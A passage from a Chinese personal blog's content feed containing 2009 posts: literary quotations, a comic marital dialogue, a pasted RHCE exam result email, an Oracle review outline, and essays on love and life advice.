rel="noopener">女人三十</a>》</p><p>23、已去之事不可留，已逝之情不可恋，能留能恋，就没有今天。——《花常好月常圆人长久》</p><p>28、生活中无论有什么闪失，统统是自己的错，与人无尤，从错处学习改过，精益求精，直至不犯同一错误，从不把过失推诿到他人肩膀上去，免得失去学乖的机会。——《阿修罗》</p><p>29、现今还有谁会照顾谁一辈子，那是多沉重的一个包袱。所以非自立不可。——《不易居》</p><p>32、人一定要受过伤才会沉默专注，无论是心灵或肉体上的创伤，对成长都有益处。——《花解语》</p><p>33、一个成熟的人往往发觉可以责怪的人越来越少，人人都有他的难处。——《我们不是天使》</p><p>34、失去的东西，其实从来未曾真正地属于你，也不必惋惜。——《玫瑰的故事》</p><p>35、何必向不值得的人证明什么，生活得更好，乃是为你自己。——《忽而今夏》</p><p>36、两个人在一起生活，岂是一项艺术，简直是修万里长城，艰苦的工程。——《玫瑰的故事》</p><p>37、有能力的人影响别人，没能力的一群受人影响。——《喜宝》</p><p>40、聪明人，无谓争意气。——《连环》</p><p>41、做人要含蓄点，得过且过，不必斤斤计较，水清无鱼，人清无徒，谁又不跟谁一辈子，一些事放在心中算了。——《蔷薇泡沫》</p><p>45、一个人走不开，不过因为他不想走开；一个人失约，乃因他不想赴约，一切借口均属废话，都是用以掩饰不愿牺牲。——《一千零一妙方》</p><p>47、人们不解释的主要原因是根本不在乎对方的想法，无关重要的人，对无关重要的事有点儿误会，有什么关系，你信也好，不信也好，都于当事人生活毫无影响，何劳解释。——《阿修罗》</p><p>48、不过女人到底是女人，日子久了就任由感情泛滥萌芽，至今日造成伤心的局面。女人都痴心妄想，总会坐大，无论开头是一夜之欢，或是同居，或是逢场作兴，到最后老是希望进一步成为白头偕老，很少有真正潇洒的女人，她们总是企图从男人身上刮下一些什么。——《胭脂》</p><p>49、爱一个人决不潇洒，为自己留了后步的，也就不是爱——《星之碎片》</p><p>50、我喜欢向没有知识但是聪明的人学习，他们那一套不讲理、原始，令人难堪，但往往行得通。受过教育的女人事事讲风度，连唯一的武器都失掉，任由社会宰割。——《玉梨魂》</p><p>51、通常吸引男人的是这种冷漠，但是男人终于娶的是仰慕他的女人，没才干的女人靠嫁人过活，有本事的女人靠自己过活——《城市故事》</p><p>52、男人！当你要求一个女人像女人的时候，问问你自己有几成像男人！——《城市故事》</p><p>53、如花美眷，也敌不过似水流年。——《风信子》</p><p>54、人生短短数十载，最要紧是满足自己，不是讨好他人。——《美丽新世界》</p><p>55、人们往往只相信他们愿意相信的事——《<a href="http://dengdefa.blog.163.com/blog/static/79698851200963093548279" target="_blank" rel="noopener">旧欢如梦</a>》</p><p>58、在金钱与爱情面前卖弄自尊，是最愚蠢的事。——《我的前半生》</p><p>59、人是那样复杂的一种动物，想了解对方根本是不可能的一件事，没有了解，又不能相处，倒不如独身。——《美娇袅》</p><p>61、做不到是你自己的事，午夜梦回，你爱怎么回味就怎么回味，但人前人后，我要你装出什么都没有发生过的样子。你可以的，我们都可以，人都是这般活下来的。——《叹息桥》</p><p>63、你要改是因为你自己愿意改，不要为任何人，怕只怕那人会令你失望，你又得打回原形。——《不易居》</p><p>66、一个人要超越他的环境及出身，进步是不够的，非要进化不可，那样大业，岂能人人做到。——《风满楼》</p><p>69、哭要一个人躲着哭，笑呢全世界陪你笑——《爱情之死》</p><p>71、骗一个人，要费好大的劲，不在乎她又如何肯骗她，所以将来有人苦苦蒙骗你，千万不要拆穿他。——《忽尔今夏》</p><p>72、自由社会，自由选择，要笑得出才能笑，否则，笑比哭还难看，也不必勉强。——《艳阳天》</p><p>74、也许一个人在真正无可奈何的时候，除了微笑，也只好微笑了。——《家明与玫瑰》</p><p>75、做人凡事要静；静静地来，静静地去，静静努力，静静收获，切忌喧哗。——《直至海枯石烂》</p><p>76．将感情埋藏得太深有时是件坏事。如果一个女人掩饰了对自己所爱的男子的感情，她也许就失去了得到他的机会。 (《傲慢与偏见》)</p><p>77．认识自己的无知是认识世界的最可靠的方法。 (《随笔集》)</p><p>78． 神要是公然去跟人作对，那是任何人都难以对付的。 (《荷马史诗》)</p><p>79．大人都学坏了，上帝正考验他们呢，你还没有受考验，你应当照着孩子的想法生活。 (《童年》)</p><p>80．幸福的家庭是相同的，不幸的家庭各有各的不同。 (《安娜.卡列尼娜》)</p><p>81．善良人在追求中纵然迷惘，却终将意识到有一条正途。(《浮士德》)</p><p>82．钟声又鸣响了……一声又一声，静谧而安详，即使在女人做新娘的那个好月份里，钟声里也总带有秋天的味道。 (《喧嚣与骚动》)</p><p>83．一个人并不是生来要被打败的，你尽可以把他消灭掉，可就是打不败他。 (《老人与海》)</p><p>84．爱情应该给人一种自由感，而不是囚禁感。 (《儿子与情人》)</p><p>85．自己的行为最惹人耻笑的人，却永远是最先去说别人坏话的人。 (《伪君子》)</p><p>86．如果冬天来了，春天还会远吗? 　(《雪莱诗选》)</p><p>87．人与人之间，最可痛心的事莫过于在你认为理应获得善意和友谊的地方，却遭受了烦扰和损害。(《巨人传》)</p><p>88．强迫经常使热恋的人更加铁心，而从来不能叫他们回心转意。(《阴谋与爱情》)</p><p>89．在各种事物的常理中，爱情是无法改变和阻挡的，因为就本性而言，爱只会自行消亡，任何计谋都难以使它逆转。(《十日谈》)</p><p>90. 谁都可能出个错儿，你在一件事情上越琢磨得多就越容易出错。(《好兵帅克历险记》)</p><p>91．悲伤使人格外敏锐。(《约翰.克里斯朵夫》</p><p>92．我在女人跟前经常失败，就是由于我太爱她们了。(《忏悔录》)</p><p>93．站在痛苦之外规劝受苦的人，是件很容易的事。(《被缚的普罗米修斯》)</p><p>94．盲目可以增加你的勇气，因为你无法看到危险．(《格列佛游记》)</p><p>95．宽宏大量，是惟一能够照亮伟大灵魂的光芒。(《巴黎圣母院》)</p><p>96．获取一颗没有被人进攻的经验的心，也就像夺取一座没有守卫的城池一样。(《茶花女》)</p><p>97．昨晚，我梦见自己又回到了曼陀丽庄园。(《蝴蝶梦》)</p><p>98．咱家是猫。名字嘛……还没有。(《<a href="http://dengdefa.blog.163.com/blog/static/79698851200963093548279" target="_blank" rel="noopener">我是猫</a>》)</p><p>100．水里照出的是自己的脸，内心反映的是自己的为人。(《圣经.旧约》)</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>老公是用来欺负的⊙</title>
      <link href="/2009/12/13/a-husband-is-a-bully/"/>
      <url>/2009/12/13/a-husband-is-a-bully/</url>
      <content type="html"><![CDATA[<p>关于讲理 　　</p><p>老公：你不讲理。　　</p><p>老婆：和你我从来就没讲过理，家就不是讲理的地方。再说你是男的，还比我大8个月呢，你就得让着我。　　　　　　             关于钱　　</p><p>老公：以后我挣的钱，按比例给你吧，我挣的多时留得也多一点，这样我较会有积极性。　　</p><p>老婆：好。　　</p><p>老公：那我给你百分之多少？　　</p><p>老婆：百分之一百二。 　</p><pre><code>关于主意 　</code></pre><p>老婆：咱们出去玩吧。　　</p><p>老公：好，你说去哪就去哪。　　</p><p>老婆：我要有主意还和你说！　　</p><p>老公：我出的主意你从来都不同意呀。</p><p>老婆：我不同意的那叫什么主意啊，那叫敷衍！你得不停的有主意，直到我满意为止。 　　</p><pre><code>关于中心</code></pre><p>老婆：我在我们家一直是中心，在你们家也得以我为中心。　　</p><p>老公：那我在我们家也一直是中心。　　</p><p>老婆：可我这中心比你那中心重要。　　</p><p>老公：为什么？　　</p><p>老婆：因为我是千金，你只是个小子。</p><pre><code>关于心情 　</code></pre><p>老婆：我一干活心情就不好了，会降低咱们的婚姻质量的。　　</p><p>老公：我干活心情也会不好啊。　　</p><p>老婆：不行，你得心里承受能力比我强。因为你个子比我大，心脏也比我大！ 　 　</p><pre><code>关于买衣服 　</code></pre><p>老婆：这衣服好看吗？　　</p><p>老公：好看。　　</p><p>老婆：你就敷衍我，想让我赶快买完了赶快回家…… 　　</p><p>老婆：那衣服好看吗？　　</p><p>老公：不好看。　　</p><p>老婆：你就舍不得给我买！ 　　</p><pre><code>关于拿东西 　　</code></pre><p>老婆：这个袋子你也拿着吧。　　</p><p>老公：我都拿着四个袋子了，你什么都不拿，好意思吗？　　</p><p>老婆：那我还挽着你呢！你有100多斤呢，我拿的东西比你拿的东西重多了。 　　</p><pre><code>关于吃东西 　　</code></pre><p>老婆：这个话梅我吃了一半，挺好吃的，剩下的给你吃吧。　　</p><p>老公：我不爱吃话梅。　　</p><p>老婆：不行，你就爱吃！你是不是嫌弃我吃过的！　</p><p>老婆：不行，你就爱吃！你是不是嫌弃我吃过的！　　</p><p>老公：这鱼挺好吃的，来。　　</p><p>老婆：你得脏筷子碰过，谁吃！　　</p><p>老公：那你吃过一半我还吃呢，我不嫌弃你，你怎么嫌弃我？　　</p><p>老婆：那就对了。我嫌弃你说明我比你干净。我比你干净你凭什么嫌弃我？！</p><p>　　关于喝水　　</p><p>老婆：老公，我要喝水！　　</p><p>老公：我给你倒去。哎，这水杯不就在你手边嘛，没看见？　　</p><p>老婆：看见了，我就是想让你递给我。</p><p>　　关于打电话</p><p>老婆：你为什么不给我打电话？！　　</p><p>老公：倒打一耙！今天不是说好你给我打电话的嘛。结果我等了一天，还是我打给你的。　　</p><p>老婆：我是说过，可我又改主意了。张爱玲说：女人有改主意的权利。　　老公：那你改主意没跟我说呀！　　</p><p>老婆：我说了，我心里说的，谁让你和我的心灵不相通的。</p><p>　　关于洗碗 　　</p><p>老公：一会你洗碗？　　</p><p>老婆：好。　　</p><p>老公：那怎么还不动啊？　　</p><p>老婆：我头疼。　　</p><p>老公：懒死了，不让你洗碗你也不头疼。　　</p><p>老婆：真的！一想到洗碗我就头疼。</p><pre><code>关于散步 　　</code></pre><p>老婆：咱们一直散步到那条马路吧。　　</p><p>老公：到那儿太远了，一会儿该走不回来了。　　</p><p>老婆：没事，你背我回来。 　</p><pre><code>关于干家务 　　</code></pre><p>老公：咱们把家务分分工吧。　　</p><p>老婆：好。首先，脏活累活得男人干吧。如擦地/刷马桶/擦桌子…… 　　</p><p>老公：这对。　　</p><p>老婆：男主外，女主内。和外人打交道的得你干吧，买菜，交水费，取报纸和牛奶。　　</p><p>老公：这。。。行！　　</p><p>老婆：你是学理工的，我是学文科的，带电的东西得你干吧，像洗衣机，电冰箱，电饭锅，电熨斗…… 　　</p><p>老公：行,行，那你干什么？　　</p><p>老婆：别着急啊，厨房里油烟那么大，可毁皮肤了，做饭也得你干吧。　　</p><p>老公：你就告诉我你干什么吧。　　</p><p>老婆：我也有很多要干的呀。我可以陪着你，监督你，赞美你，安慰你……</p><p>　　关于异性朋友 　　</p><p>老婆：我可以有男朋友，你不能干涉我。　　</p><p>老公：行，我也交个女朋友。　　</p><p>老婆：不行！　　</p><p>老公：凭什么你行我不行呀。　</p><p>老婆：我交男朋友，你做不到的人家能做到，我就不会老挑你的毛病了，有利于家庭幸福。你交女朋友，我心眼儿小，吃醋和你吵叫，不利于家庭安定。　　</p><p>老公：那我也心眼儿小。　　</p><p>老婆：一个男人，和女人一样心眼儿小，亏你好意思说！</p><p>　　关于婚外恋 　　</p><p>老婆：现在电视里老演婚外恋，你说，你会有婚外恋吗？　　</p><p>老公：不会。　　</p><p>老婆：为什么？　　</p><p>老公：有你一个我就够后悔的了，决不能再要第二个！！　　然后--- 　</p><p>　 　　关于睡觉（一）</p><p>老公：你那么小人，怎么占那么大地儿！　　</p><p>老婆：那当然，我得翻身，还得伸懒腰呢！</p><p>　　关于睡觉（二） 　　</p><p>老婆：咱们盖那个双人被吧。　　</p><p>老公：别！那到第二天早上就全裹你身上了。我什么也盖不着。还是自己盖自己的吧，心里踏实。　　</p><p>老婆：哼，你就是自己盖，到明天早上照样也得被我裹走！</p><p>　　关于起床 　　</p><p>老公：起床了，起床了，你不说今天要早起开会嘛. 　　</p><p>老婆：别吵我，我再睡一会。　　</p><p>老公：快起来吧，会迟到了。　　</p><p>老婆：你别碰我！我还要睡啦！！　　</p><p>老婆：呀！都迟到了！你怎么不叫我呢？！</p><p>　　关于吃饭 　　</p><p>老婆：老公，咱们到那里吃饭啊，吃什么？　　老公：你想吃什么？　　</p><p>老婆：什么都让我决定啊，那我还要你干什么？随便，你说吃什么就吃什么　　</p><p>老公：那我们去XXX吃XXX吧　　</p><p>老婆：大怒，又吃这个啊，你能不能有点创意　　每次这样我生气的都想发火</p><p>　　关于真话　　</p><p>老婆：你看，那女孩多好看。　　</p><p>老公：好看什么啊。　　</p><p>老婆：你什么意思！你为什么不和我保持一致！　　</p><p>老公：好看好看。　　</p><p>老公：哎，你别走啊，怎么不理我了？</p><p>　　关于孩子 　　</p><p>老婆：咱们要个孩子吧。　　</p><p>老公：行。　　</p><p>老婆：那你喜欢咱们的孩子吗？　　</p><p>老公：喜欢。　　</p><p>老婆：那不行！你就得喜欢我一个人！</p><p>老公：好，好，我就喜欢你一个人。　　</p><p>老婆：那我的孩子你凭什么不喜欢阿！　　</p><p>老公：咱还是别要孩子了。 　　</p><p>　　关于离婚　　</p><p>老婆：咱们要是离了婚，房子归我，我的钱我也得拿走。　　老公：那我的钱呢？　　</p><p>老婆：你的钱都是我的钱，你有什么钱! 　　</p><p>老婆：还有，离婚后你每月的收入也得给我80%。嗯，如果你再结婚了，那就给我60%就成了。　　</p><p>老公：老婆，我决不跟你离婚！ 　　</p><p>　　关于那女平等 　　</p><p>老公：都说男女平等，咱们家是不是也得平等平等？　　</p><p>老婆：行啊。你们男的欺负女的欺负了好几千年。等我们也欺负了你们欺负几千年，才是真正的平等呢。别急，再过几千年，咱们家就平等了。 　　</p><p>关于幸福 　　</p><p>老婆：你娶了我是不是特别幸福啊？　　</p><p>老公：没觉得。你又不讲理，又不干活，还老折腾人，我怎么幸福啊。　　</p><p>老婆：这就是你的幸福啊。我不讲理，才能反衬出你的宽容大度；我不干活，就培养出了你，所谓艺多不压身，让你能力强还不好吗；我折腾人，你的生活才充满了多彩多姿，你看，你的婚姻生活就不像别人家难么单调吧。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>祝贺一下自己通过RHCE考试</title>
      <link href="/2009/12/13/congratulate-yourself-on-passing-the-rhce-exam/"/>
      <url>/2009/12/13/congratulate-yourself-on-passing-the-rhce-exam/</url>
      <content type="html"><![CDATA[<p>RHCE考试通过了，祝贺一下自己。。哈哈。。。。</p><p>Dear suchalin:</p><p>The results of your RHCE Certification Exam are reported below.  The</p><p>RHCE Certification Exam allows candidates to qualify for the</p><p>Red Hat Certified Engineer (RHCE) and Red Hat Certified Technician</p><p>(RHCT) certificates.  Please note that the RHCE designation is</p><p>understood to both include and supersede the RHCT designation.</p><p>RHCE requirements: score of 70 or higher on RHCT components (100 points)</p><pre><code>score of 70 or higher on RHCE components (100 points)</code></pre><p>RHCT requirement:  score of 70 or higher on RHCT components (100 points)</p><p>RHCT components score:                             92.6</p><p>RHCE components score:                             100.0</p><p>RHCE Certification:                                PASS</p><p>Congratulations – you are now certified as a Red Hat Certified</p><p>Engineer!  Your RHCE Certificate number is 805009666042835.</p><p>The attached file is your personal print-ready certificate.</p><p>You are entitled to print this document and use it to demonstrate</p><p>that you are an RHCE, provided you remain an RHCE in good standing.</p><p>You may not modify or change the document’s contents in any way, nor</p><p>may you appropriate any elements of this document for use in other</p><p>electronic documents or printed materials.  You may only print the</p><p>document in its entirety.  Any other use of the document must be</p><p>approved by Red Hat, Inc.</p><p>Your RHCE number should be available for verification at Red Hat</p><p>Certification Central:</p><p><a href="http://www.redhat.com/training/certification/verify/?rhce\_cert\_display:certno=805009666042835&amp;rhce\_cert\_display:verify_cb=Verify" target="_blank" rel="noopener">http://www.redhat.com/training/certification/verify/?rhce\_cert\_display:certno=805009666042835&amp;rhce\_cert\_display:verify_cb=Verify</a></p><p>You can verify the certificates of other RHCEs and RHCTs at</p><p><a href="https://www.redhat.com/training/certification/verify" target="_blank" rel="noopener">https://www.redhat.com/training/certification/verify</a></p><p>Please visit RHCE Connection, our web site exclusively for RHCEs:</p><p><a href="https://www.redhat.com/training/certification/" target="_blank" rel="noopener">https://www.redhat.com/training/certification/</a></p><p>There you will find special offers from Red Hat, logo art, forums, job</p><p>listings, and more.  You can also use the site to manage your contact</p><p>information.  In order to access the site, you will need a PIN number.</p><p>You can have the PIN sent to the email address we have on file at</p><p><a href="https://www.redhat.com/training/certification/lostpin.html" target="_blank" rel="noopener">https://www.redhat.com/training/certification/lostpin.html</a></p><p>If you wish to connect to the forums directly:</p><p><a href="https://certforums.redhat.com" target="_blank" rel="noopener">https://certforums.redhat.com</a></p><p>Certification in Red Hat Enterprise Linux opens up new opportunities.</p><p>We hope you will keep Red Hat updated with your experiences and successes</p><p>with Red Hat Enterprise Linux.</p><p>Please feel free to contact us with ideas and suggestions as to ways</p><p>we can enhance our Red Hat Enterprise Linux training and certification</p><p>programs at</p><p><a href="https://www.redhat.com/training/certification/comments.html" target="_blank" rel="noopener">https://www.redhat.com/training/certification/comments.html</a></p><p>Thank you very much for your interest in Red Hat Enterprise Linux!</p><p>Red Hat Certification Central</p>]]></content>
      
      <categories>
          
          <category> 进步进行中 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Oracle 复习大纲！</title>
      <link href="/2009/12/13/oracle-review-outline/"/>
      <url>/2009/12/13/oracle-review-outline/</url>
      <content type="html"><![CDATA[<p>第一部分：语句执行，此部分包括Library cache、Buffer cache和PGA，这些内容，对于一个语句的执行，是最必须的。Library cache和软、硬解析关系密切，Buffer cache是数据读取时的重要部分，PGA贯穿了语句执行的前前后后。</p><p>第二部分：语句支持，此部分包括回滚、重做和控制文件，</p><p>第三部分：数据存贮，包括表空间、表、索引。</p><p>第四部分：语句优化，包括执行计划，表、索引的资料收集。</p><p>第五部分：锁、闩与等待事件，总的论述一下排故时的思路。</p><p>最近得一高人的指点开始了Oracle 的复习工作！上面的这是oracle 的复习大纲。</p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>我是很囧的分割线<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p>事情比较多。因为还要上班儿所以本来就不多的时间就更加显得紧张！12月份的RAC和Data Guard的课是一定要上的，只能抽出时间来好好复习！我看到了内存组建还有Oracle 的进程这部分。后面还有好多的内容都是比较具体的东西，命令比较多。多多练习就可以了，在不停的复习以后才发现老袁在讲课的时候有些东西是没有涉及到的，你好比说像library cache 的具体组成结构他就没有说。像什么hash bucket 、object handle 这些个概念都没有提过。好在最近发现看书的进度还有理解能力都在逐渐增强，不懂的也可以去问问一块在杭州学习的那几个朋友。</p><p>最近眼睛疼的厉害，早上睁开眼的时候基本上我的眼白是看不到的。满满的血丝，相当的恐怖。这个时候蓝颜色的镜片就起到了很好的遮挡作用，让我看起来多少精神点。</p><p>最近流感还是比较厉害的，想去吃鸡蛋灌饼都要左思右想。真的麻烦！不过每天体温还是在36℃左右，保持的很好。比较欣慰！</p><p>剩下的时间就要好好复习了，希望眼睛早点好。这样就可以熬夜看书了！毕竟晚上的效率还是很高的嘛。贴出了这个复习的提纲希望各位OCP和各位DBA们能够通过具体的学习更上一层楼，努力！奋斗！加油！</p>]]></content>
      
      <categories>
          
          <category> 进步进行中 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>真正爱一个人</title>
      <link href="/2009/12/13/truly-love-someone/"/>
      <url>/2009/12/13/truly-love-someone/</url>
      <content type="html"><![CDATA[<p>不管你有没有男朋友，有没有女朋友，都过来把它读完，写的真是那么回事</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/imgcache_qq_b.gif" alt="真正爱一个人 - suchalin - 为了更好的生活而奋斗！" title="真正爱一个人 - suchalin - 为了更好的生活而奋斗！"></p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/imgcache_qq_b.gif" alt="真正爱一个人 - suchalin - 为了更好的生活而奋斗！" title="真正爱一个人 - suchalin - 为了更好的生活而奋斗！"></p><p>你发觉了吗？</p><p><a href="http://b25.photo.store.qq.com/http_imgload.cgi?/rurl4_b=8ded7dfa0771b1b33d2380c5dc015f447b10202e986e7bc70d536cba586c96f0e3b895d14160365529937c8e9b19d8368481398b9d00270f6b46dcf0806ffa6b3edb398abffa7d531eb292a43146eade37964ac3&amp;a=24&amp;b=25" target="_blank" rel="noopener"></a><a href="http://b25.photo.store.qq.com/http_imgload.cgi?/rurl4_b=8ded7dfa0771b1b33d2380c5dc015f447b10202e986e7bc70d536cba586c96f0e3b895d14160365529937c8e9b19d8368481398b9d00270f6b46dcf0806ffa6b3edb398abffa7d531eb292a43146eade37964ac3&amp;a=24&amp;b=25" target="_blank" rel="noopener"><img src="http://b25.photo.store.qq.com/http_imgload.cgi?/rurl4_b=8ded7dfa0771b1b33d2380c5dc015f447b10202e986e7bc70d536cba586c96f0e3b895d14160365529937c8e9b19d8368481398b9d00270f6b46dcf0806ffa6b3edb398abffa7d531eb292a43146eade37964ac3&amp;a=24&amp;b=25" alt="真正爱一个人 - suchalin - 为了更好的生活而奋斗！" title="真正爱一个人 - suchalin - 为了更好的生活而奋斗！"></a></p><p>爱的感觉，总是在一开始觉得很甜蜜，</p><p>　　总觉得多一个人陪、多一个人帮你分担，</p><p>　　你终於不再孤单了，至少有一个人想著你、</p><p>　　恋著你，不论做什么事情，</p><p>　　只要能一起，就是好的….</p><p>　　 …</p><p>….但是慢慢的，随著彼此的认识愈深，</p><p>　　你开始发现了对方的缺点，</p><p>　　於是问题一个接著一个发生，</p><p>　　你开始烦、累，甚至想要逃避，</p><p>　　有人说爱情就像在捡石头，</p><p>　　总想捡到一个适合自己的，</p><p>　　但是你又如何知道什么时候能够捡到呢？</p><p>　　他/她适合你，那你又适合他/她吗?</p><p>其实，爱情就像磨石子一样，</p><p>　　或许刚捡到的时候，你不是那么的满意，</p><p>　　但是记住人是有弹性的，</p><p>　　很多事情是可以改变的，</p><p>　　只要你有心、有勇气，</p><p>　　与其到处去捡未知的石头，</p><p>　　还不如好好的将自己已经拥有的石头磨亮，你开始磨了吗？</p><p>　　很多人以为是因为感情淡了，</p><p>　　所以人才会变得懒惰。</p><p>　　错！</p><p>　　其实是人先被惰性征服，</p><p>　　所以感情才会变淡的。</p><p>在某个聚餐的场合，</p><p>　　有人提议多吃点虾对身体好，</p><p>　　这时候有个中年男人忽然说「十年前，当我老婆还是我的女朋友的时候,她说要吃十只虾，我就剥二十只给她！</p><p>　　现在，如果她要我帮她剥虾壳，开玩笑！我连帮她脱衣服都没兴趣了，还剥虾壳咧！」</p><p>　　听到了吗？明白了吗？</p><p>　　难怪越来越多人只想要谈一辈子的恋爱，</p><p>　　却迟迟不肯走入婚姻。</p><p>　　因为，婚姻容易让人变得懒惰。</p><p>如果每个人都</p><p>　　懒得讲话、</p><p>　　懒得倾听、</p><p>　　懒得制造惊喜、</p><p>　　懒得温柔体贴，</p><p>　　那么夫妻或是情人之间，</p><p>　　又怎么会不渐行渐远渐无声呢？</p><p>*所以请记住：</p><p>　　有活力的爱情，</p><p>　　是需要适度殷勤灌溉的，</p><p>　　谈恋爱，更是不可以偷懒的喔！</p><p>　　有一对情侣，相约下班後去用餐、逛街，</p><p>　　可是女孩因为公司会议而延误了，</p><p>　　当她冒著雨赶到的时候已经迟到了30多分钟，</p><p>　　他的男朋友很不高兴的说：</p><p>　　你每次都这样，现在我甚么心情也没了，</p><p>　　我以後再也不会等你了！</p><p>　　刹那间，女孩终於决堤崩溃了，</p><p>　　她心里在想：或许，他们再也没有未来了</p><p>　　同样的在同一个地点，另一对情侣也面临同样的处境；</p><p>　　女孩赶到的时候也迟到了半个钟头，</p><p>　　他的男朋友说：「我想你一定忙坏了吧！」</p><p>　　接著他为女孩拭去脸上的雨水，并且脱去外套盖在女孩身上，</p><p>　　此刻，女孩流泪了</p><p>　　但是流过她脸颊的泪却是温馨的。</p><p>你体会到了吗？</p><p>　　其实爱、恨往往只是在我们的一念之间！</p><p>　　爱不仅要懂得宽容更要及时，</p><p>　　很多事可能只是在於你心境的转变罢了！</p><p>　　懂了吗？</p><p>　　当有个人爱上你，而你也觉得他不错。</p><p>　　那并不代表你会选择他。</p><p>　　我们总说：「我要找一个自己很爱很爱的人，才会谈恋爱。」</p><p>　　但是当对方问你，怎样才算是很爱很爱的时候，</p><p>　　你却无法回答他，因为你自己也不知道。</p><p>　　没错，我们总是以为，我们会找到一个自己很爱很爱的人。</p><p>　　可是後来，当我们猛然回首，我们才会发觉自己曾经多么天真。</p><p>　　假如从来没有开始，你怎么知道自己会不会很爱很爱那个人呢？</p><p>　　其实，很爱很爱的感觉，是要在一起经历了许多事情之後才会发现的。</p><p>　　或许每个人都希望能够找到自己心目中百分之百的伴侣，</p><p>　　但是你有没有想过『在你身边会不会早已经有人默默对你付出很久了，只是你没发觉而已呢？』</p><p>　　所以，还是仔细看看身边的人吧！他或许已经等你很久了</p><p>　　当你爱一个人的时候，爱到八分绝对刚刚好。</p><p>　　所有的期待和希望都只有七八分；剩下两三分用来爱自己。</p><p>　　如果你还继续爱得更多，很可能会给对方沉重的压力，让彼此喘不过气来，</p><p>　　完全丧失了爱情的乐趣。</p><p>　　所以请记住，</p><p>　　喝酒不要超过六分醉，</p><p>　　吃饭不要超过七分饱，</p><p>　　爱一个人不要超过八分</p><p>　　如果你也正在为爱迷惘，或许下面这段话可以给你一些启示：</p><p>爱一个人，要了解，也要开解；</p><p>　　要道歉，也要道谢；</p><p>　　要认错，也要改错；</p><p>　　要体贴，也要体谅；</p><p>　　是接受，而不是忍受；</p><p>　　是宽容，而不是纵容；</p><p>　　是支持，而不是支配；</p><p>　　是慰问，而不是质问；</p><p>　　是倾诉，而不是控诉；</p><p>　　是难忘，而不是遗忘；</p><p>　　是彼此交流，而不是凡事交代；</p><p>　　是为对方默默祈求，</p><p>　　而不是向对方诸多要求；</p><p>　　可以浪漫，但不要浪费；</p><p>　　 `*不要随便牵手，</p><p>　　 `*更不要随便放手</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>给自己10个忠告</title>
      <link href="/2009/12/13/give-yourself-10-good-advice/"/>
      <url>/2009/12/13/give-yourself-10-good-advice/</url>
      <content type="html"><![CDATA[<p>1、努力</p><p>工作要努力，随随便便过日子过四五年也是过，稍微努力的过四五年也是过，努力的过四五年也是过，何不努力好好的干。如果努力的过好毕业后的四五年，这对我们以后的人生非常有帮助。</p><p>2、虚心学习</p><p>多与比自己大的人(长辈)/成功人士交流学习，要虚心听取/认真分析他们的意见和建议，以免自己以后走弯路。</p><p>3、自由</p><p>出来外面做事情，关键是自由，愉快，能学到知识。每走一步都要分析，不要因某一小点利益限制了自己的自由。记住，30岁之前，不要太在意自己的存款和职位，这些对以后来说太微不足道了。</p><p>4、目标</p><p>参加一次21天训练营，提高一下自己实现目标的素质和方法。人生一定要有目标，不仅仅是事业(赚钱)的目标，其他方面也要有目标，如爱情方面的目标，健康方面的目标，家庭方面的目标。各个目标都要重视。只赚了钱，不算成功的人生，也迟早会应了“短木桶效应”。</p><p>5、计划。</p><p>给自己定一个五年计划，十年规划。每季度做什么事情，每个月做什么事情，甚至每天做什么事情。不要每天浑浑噩噩。说什么计划敢不上变化的，几年后你就会发现，几年来一直没有目标，什么也没有做成。</p><p>6、惜时。</p><p>如果以上你都做了，我估计你的时间过得很快。不要因碌碌无为而悔恨！我常听某某人说：“这一辈子，就象昨天今天一样。” 毛泽东说：“天地转，光阴迫。一万年太久，只争朝夕。” “三十八年过去，弹指一挥间。”</p><p>7、了解社会</p><p>多了解社会，多实践。多分析某些社会现象的因果厉害关系。认真分析身边发生的某些事情。 正视社会的阴暗面，分析社会上某些不良风气，不要清高自傲，也不要随波逐流。某些时候办事情，是需要这方面帮助的。</p><p>8、不要害怕贫穷</p><p>也许你家里没有几十万上百万。大胆的去做事情，不要怕贫穷。即使我们事情做失败了，我们大不了回到起点——还是穷人。</p><p>9、吃苦耐劳</p><p>不要怕吃苦。在创业阶段，我们要的是名气，是经验，有时候在保本的情况下可以以低价策略来和别人竞争。我们出卖的是点脑力活，力气活，年轻人，睡一觉起来什么都恢复了。</p><p>10、合作</p><p>不要随便与人合作，与人合作要考虑好利与弊。如果有想法尽快去干，一个人努力的干，卖命的干。干到差不多了，有资本了，可以与人短期性的合作。与人合作目标一定要明确！</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>让HR最头疼的3大面试现象</title>
      <link href="/2009/12/11/the-three-biggest-interview-phenomena-that-have-the-most-headache-for-hr/"/>
      <url>/2009/12/11/the-three-biggest-interview-phenomena-that-have-the-most-headache-for-hr/</url>
